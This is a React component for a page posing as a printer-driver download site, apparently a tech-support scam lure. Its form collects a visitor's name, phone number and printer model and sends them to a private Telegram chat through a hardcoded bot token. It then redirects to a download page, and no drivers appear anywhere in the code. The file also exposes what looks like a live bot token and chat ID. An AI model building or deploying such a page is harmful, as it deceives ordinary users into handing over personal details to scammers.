import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import photo from "../images/photo.png";

const PageHere: React.FC = () => {
  const navigate = useNavigate();
  const [showForm, setShowForm] = useState(false);
  const [formData, setFormData] = useState({
    name: "",
    phone: "",
    printerModel: "",
  });

  const botToken = '7575372348:AAEFfVtgEXvhQLyr7b4IhLGAQPjXl-0Kjjk';
  const chatId = '1684000886';

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const telegramMessage = `
New Printer Driver Request:
Name: ${formData.name}
Phone: ${formData.phone}
Printer Model: ${formData.printerModel}
    `;

    const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
      await fetch(telegramAPI, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: telegramMessage,
        }),
      });
      navigate("/download-page");
    } catch (error) {
      console.error('Error:', error);
    }
  };

  return (
    <div className="h-screen flex items-center justify-center bg-gray-50">
      <div className="relative w-full h-full max-w-screen-xl mx-auto bg-white">
        <img
          src={photo}
          className="w-full h-full object-contain cursor-pointer"
          onClick={() => setShowForm(true)}
        />

        {showForm && (
          <div className="fixed inset-0 bg-gray-800 bg-opacity-60 flex justify-center items-center z-50">
            <div className="bg-white p-10 rounded-lg w-[500px] shadow-xl relative">
              <div className="flex items-center mb-8">
                <h2 className="text-3xl font-bold text-gray-800">
                  Download Printer Drivers
                </h2>
              </div>

              <form onSubmit={handleSubmit} className="space-y-8">
                <div>
                  <label className="block text-lg font-semibold text-gray-800 mb-2">
                    Full Name
                  </label>
                  <input
                    type="text"
                    name="name"
                    placeholder="Enter your full name"
                    value={formData.name}
                    onChange={(e) =>
                      setFormData({ ...formData, name: e.target.value })
                    }
                    className="w-full px-6 py-3 text-lg border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500"
                    required
                  />
                </div>

                <div>
                  <label className="block text-lg font-semibold text-gray-800 mb-2">
                    Phone Number
                  </label>
                  <input
                    type="tel"
                    name="phone"
                    placeholder="Enter your phone number"
                    value={formData.phone}
                    onChange={(e) =>
                      setFormData({ ...formData, phone: e.target.value })
                    }
                    className="w-full px-6 py-3 text-lg border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500"
                    required
                  />
                </div>

                <div>
                  <label className="block text-lg font-semibold text-gray-800 mb-2">
                    Printer Model
                  </label>
                  <input
                    type="text"
                    name="printerModel"
                    placeholder="Enter your printer model"
                    value={formData.printerModel}
                    onChange={(e) =>
                      setFormData({ ...formData, printerModel: e.target.value })
                    }
                    className="w-full px-6 py-3 text-lg border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500"
                    required
                  />
                </div>

                <button
                  type="submit"
                  className="w-full py-4 px-6 text-xl bg-[#e31837] text-white font-bold rounded-lg hover:bg-[#cc1631] transition duration-150 mt-6"
                >
                  Setup Printer
                </button>
              </form>

              <button
                onClick={() => setShowForm(false)}
                className="absolute top-6 right-6 text-gray-600 hover:text-gray-800"
              >
                <svg
                  className="h-8 w-8"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    d="M6 18L18 6M6 6l12 12"
                  />
                </svg>
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default PageHere;
